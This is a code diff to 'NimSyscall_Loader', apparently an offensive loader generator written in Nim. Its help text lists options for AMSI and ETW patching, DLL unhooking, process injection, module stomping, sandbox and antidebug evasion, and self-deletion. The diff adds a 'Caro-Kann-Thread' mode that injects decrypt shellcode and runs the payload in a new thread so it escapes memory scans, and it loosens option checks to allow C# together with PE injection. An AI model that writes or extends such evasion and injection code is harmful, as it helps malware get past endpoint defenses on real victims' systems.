@@ -68,7 +68,7 @@ let helpmenu = """
 NimSyscall_Loader v 2.1
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --poolparty=<number> --Caro-Kann --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --poolparty=<number> --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -199,6 +199,7 @@ Options:
       --threadlessFunc dllfunc    Specify a function to use for the Threadless inject hook
   --poolparty number    Use Poolparty technique 1,2,3,4 for execution
   --Caro-Kann    Use Caro-Kann technique to bypass initial memory scan detections by injecting a second shellcode which sleeps and decrypts (https://github.com/S3cur3Th1sSh1t/Caro-Kann)  
+  --Caro-Kann-Thread   Same as Caro-Kann, but the Shellcode will not do a direct JMP but instead create a Thread on the start address 
   --stomb    Enable Module Stomping to not do memory allocations. By default, 'chakra.dll' is loaded and stomped.
       --stombDll dllname    Specify a DLL to use for the Module Stomping (default is 'chakra.dll')
       --stombFunc dllfunc    Specify a function to use for the Module Stomping
@@ -360,6 +361,7 @@ var
     threadlessFunc: string = "NtWaitForMultipleObjects" # called regularly by RuntimeBroker.exe which is default spawn inject target.
     suspended: bool = true
     carokann: bool = false
+    carokannthread: bool = false
     stomb: bool = false
     stombDll: string = "chakra.dll"
     stombFunc: string = "JsCreateThreadService"
@@ -801,6 +803,10 @@ if args["--poolparty"]:
 if args["--Caro-Kann"]:
     carokann = true
 
+if args["--Caro-Kann-Thread"]:
+    carokann = true
+    carokannthread = true
+
 if args["--stomb"]:
     stomb = true
 
@@ -852,7 +858,7 @@ if (hellsgate and jump):
     echo "Error: Cannot use both --hellsgate and --jump! --jump can only be used with --syswhispers"
     quit(1)
 
-if ((csharp and shellcode) or (csharp and peload) or (csharp and peinject) or (peload and shellcode)):
+if ((csharp and shellcode) or (csharp and peload) or (peload and shellcode)):
     echo "Error: You can only use one of --csharp, --shellcode, --peload, or --peinject!"
     quit(1)
 
@@ -915,7 +921,8 @@ if (peload and shellcode):
     quit(1)
 
 # DripAllocate, CallbackExecute, localCreateThread, QueueApc, MapSection, Caro-Kann are shellcode specific. They cannot be used in combination with csharp, interactivePS or peload
-if((csharp or interactivePS) and (dripallocate or callbackexecute or localCreateThread or useQueueAPC or remoteMapSection or carokann)):
+# but when csharp and peinject is set, this is possible.
+if(((csharp or interactivePS) and not peinject) and (dripallocate or callbackexecute or localCreateThread or useQueueAPC or remoteMapSection or carokann)):
     echo "Error: Cannot use --csharp/--interactivePS with --dripallocate/--CallbackExecute/--localCreateThread/--QueueApc/--mapSection/--Caro-Kann!"
     echo "This is Shellcode specific options."
     quit(1)
@@ -1136,7 +1143,15 @@ if(carokann):
     # The egg is 4 bytes long, so we need to generate a random 4 byte key
     
     # when Caro-Kann, Stomb and ThreadlessInject are used, decryptprotectfull.bin should be used. Otherwise decryptprotect.bin
-    const hookShellcode = slurp"decryptprotect.bin"
+    
+  
+    var hookShellcode: string
+    when defined(carokannthread):
+        const slurpValue = slurp"decryptprotectthread.bin"
+        hookShellcode = slurpValue
+    else:
+        const slurpValue = slurp"decryptprotect.bin"
+        hookShellcode = slurpValue
     
     
     var hookShellcodeBytes: seq[byte] = toByteSeq(hookShellcode)
@@ -3944,7 +3959,7 @@ if(dll_out or cpl):
     if ((hide == false) and (apiHide == false)):
         stub.add(DLLNoHideStub)
 
-if (csharp):
+if (csharp and not peinject):
     stub.add(getRandStub())
     if (noArgs):
         stub.add(LoadAssemblyStub)
